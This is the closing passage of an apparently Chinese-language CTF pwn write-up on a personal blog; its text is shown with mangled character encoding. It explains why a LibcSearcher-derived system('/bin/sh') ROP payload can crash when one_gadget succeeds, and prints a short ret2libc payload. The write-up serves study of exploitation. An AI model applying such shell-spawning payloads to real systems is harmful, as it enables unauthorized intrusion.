<p>æ‰¾åˆ°åˆé€‚çš„åç§»é‡å³å¯</p>
<p>æ‰€ä»¥ï¼Œ<code>LibcSearcher</code> åŒ¹é…çš„ç‰ˆæœ¬æ˜¯<strong>å®ƒè‡ªå·±æ•°æ®åº“ä¸­</strong>çš„ç‰ˆæœ¬ï¼Œè€Œä¸æ˜¯ä½ æœ¬åœ°è®¡ç®—æœºä¸Š <code>/lib/x86_64-linux-gnu/libc.so.6</code> è¿™æ ·çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">system=libc_base+libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh=libc_base+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">payload=b&#x27;a&#x27;*(0x60+8)+p64(pop_rdi)+p64(binsh)+p64(system)</span><br></pre></td></tr></table></figure>

<p>æ˜¯ç”¨å®ƒLibcSearcheråŒ¹é…çš„ç‰ˆæœ¬ï¼Œè€Œone_gadgetæ˜¯ç”¨æˆ‘ä»¬åŒ¹é…ä¸‹è½½çš„libcæ–‡ä»¶å»å®é™…è®¡ç®—çš„ï¼Œæ›´å‡†ç¡®</p>
<p><strong><code>system(&quot;/bin/sh&quot;)</code> çš„å¤±è´¥ï¼š</strong></p>
<ul>
<li><p><code>system(&quot;/bin/sh&quot;)</code> æ–¹æ³•éœ€è¦è®¡ç®— <code>system</code> å‡½æ•°çš„åœ°å€ (<code>libc_base + libc.dump(&#39;system&#39;)</code>) å’Œ <code>&quot;/bin/sh&quot;</code> å­—ç¬¦ä¸²çš„åœ°å€ (<code>libc_base + libc.dump(&#39;str_bin_sh&#39;)</code>)ã€‚</p>
</li>
<li><p>å¦‚æœè¿™ç§æ–¹æ³•å¤±è´¥ï¼Œ<strong>æœ€æ ¸å¿ƒçš„åŸå› æ˜¯ <code>LibcSearcher</code> ä¸ºä½ é€‰å®šçš„é‚£ä¸ª <code>libc</code> ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ <code>libc6_2.23-0ubuntu10_amd64</code>ï¼‰ï¼Œè™½ç„¶å…¶ <code>puts</code> åç§»å’Œ <code>one_gadget</code> çš„ç‰¹å®šåç§»ä¸è¿œç¨‹æœåŠ¡å™¨ç›¸ç¬¦ï¼Œä½†å…¶å†…éƒ¨è®°å½•çš„ <code>system</code> å‡½æ•°å’Œ <code>&quot;/bin/sh&quot;</code> å­—ç¬¦ä¸²çš„ç›¸å¯¹åç§»é‡ï¼Œä¸è¿œç¨‹æœåŠ¡å™¨å®é™… <code>libc</code> ä¸­çš„è¿™ä¸¤ä¸ªåç§»é‡</strong>ä¸ä¸€è‡´**ã€‚</p>
</li>
<li><p><code>libc</code> ç‰ˆæœ¬å·ï¼ˆå¦‚ <code>2.23</code>ï¼‰å¯èƒ½ç›¸åŒï¼Œä½†ä¸åŒçš„å‘è¡Œç‰ˆæˆ–ç¼–è¯‘é€‰é¡¹ï¼ˆå¦‚ <code>ubuntu10</code> vs <code>ubuntu11</code>ï¼Œæˆ–ä¸åŒçš„æ„å»ºæ—¥æœŸï¼‰ä¼šå¯¼è‡´å†…éƒ¨å‡½æ•°å’Œå­—ç¬¦ä¸²çš„å…·ä½“ç›¸å¯¹ä½ç½®å­˜åœ¨ç»†å¾®å·®å¼‚ã€‚å³ä½¿ <code>puts</code> å’ŒæŸä¸ª <code>one_gadget</code> çš„åç§»æ°å¥½ç›¸åŒï¼Œ<code>system</code> æˆ– <code>&quot;/bin/sh&quot;</code> çš„åç§»å¯èƒ½å°±ä¸åŒäº†ã€‚</p>
</li>
<li><p>å½“ä½ ç”¨é”™è¯¯çš„åç§»é‡è®¡ç®—å‡º <code>system</code> å’Œ <code>&quot;/bin/sh&quot;</code> çš„åœ°å€å¹¶å°è¯•è·³è½¬æ—¶ï¼Œç¨‹åºä¼šå› ä¸º <code>RIP</code> æŒ‡å‘æ— æ•ˆåœ°å€æˆ– <code>system</code> å‡½æ•°æ¥æ”¶åˆ°æ— </p>
<p>æ•ˆå‚æ•°è€Œå´©æºƒï¼ˆ<code>dumped core</code>ï¼‰ã€‚</p>
</li>
</ul>

                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/BUU/">BUU</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/PWN/">PWN</a>
                                    </li>
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/one-gadget/">one_gadget</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                    </div>
                </div>

                

                
                    <div class="post-nav border-box">
                        
                            <div class="prev-post">
                                <a class="prev"
                                   rel="prev"
                                   href="/2025/07/29/ez-pz-hackover-2016/"
                                   title="ez_pz_hackover_2016"
                                >
                                    <span class="left arrow-icon flex-center">
                                        <i class="fas fa-chevron-left"></i>
                                    </span>
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">ez_pz_hackover_2016</span>
                                        <span class="post-nav-item">Prev posts</span>
                                    </span>
                                </a>
                            </div>
                        
                        
                            <div class="next-post">
                                <a class="next"
                                   rel="next"
                                   href="/2025/07/26/pwn49/"
                                   title="pwn49"
                                >
                                    <span class="title flex-center">
                                        <span class="post-nav-title-item text-ellipsis">pwn49</span>
                                        <span class="post-nav-item">Next posts</span>
                                    </span>
                                    <span class="right arrow-icon flex-center">
                                        <i class="fas fa-chevron-right"></i>
                                    </span>
                                </a>
                            </div>
                        
                    </div>
                

                
                    






                
            </div>
        </div>

        
    </div>
</div>


                
            </div>
        </div>

        <div class="page-main-content-bottom border-box">
            
<footer class="footer border-box">
    <div class="copyright-info info-item">
    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
    
            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
        
    </div>

    <div class="theme-info info-item">
        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
    </div>

    

    

    
</footer>

        </div>
    </div>

    <!-- post tools -->
    
        <div class="post-tools right-toc">
            <div class="post-tools-container border-box">
    <ul class="post-tools-list border-box">
        <!-- PC encrypt again -->
        

        <!-- PC TOC show toggle -->
        

        <!-- PC go comment -->
        

        <!-- PC full screen -->
        <li class="tools-item flex-center full-screen">
            <i class="fa-solid fa-expand"></i>
        </li>
    </ul>
</div>

        </div>
    

    <!-- side tools -->
    <div class="side-tools">
        <div class="side-tools-container border-box ">
    <ul class="side-tools-list side-tools-show-handle border-box">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <!-- toggle mode -->
        
            <li class="tools-item tool-toggle-theme-mode flex-center">
                <i class="fas fa-moon"></i>
            </li>
        

        <!-- rss -->
        

        <!-- to bottom -->
        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list border-box">
        

        

        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>

        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
            <i class="arrow fas fa-arrow-up"></i>
            <span class="percent"></span>
        </li>
    </ul>
</div>

    </div>

    <!-- image mask -->
    <div class="zoom-in-image-mask">
    <img class="zoom-in-image">
</div>


    <!-- local search -->
    

    <!-- tablet toc -->
    
</main>





<!-- common js -->

<script src="/js/utils.js"></script>

<script src="/js/header-shrink.js"></script>

<script src="/js/back2top.js"></script>

<script src="/js/toggle-theme.js"></script>

<script src="/js/code-block.js"></script>

<script src="/js/main.js"></script>

<script src="/js/libs/anime.min.js"></script>


<!-- local search -->


<!-- lazyload -->


<div class="">
    <!-- home page -->
    

    <!-- post page -->
    
        <!-- post-helper -->
        
<script src="/js/post/post-helper.js"></script>


        <!-- toc -->
        

        <!-- copyright-info -->
        

        <!-- share -->
        
    

    <!-- categories page -->
    

    <!-- links page -->
    

    <!-- photos page -->
    

    <!-- tools page -->
    
</div>

<!-- mermaid -->


<!-- pjax -->



</body>
</html>
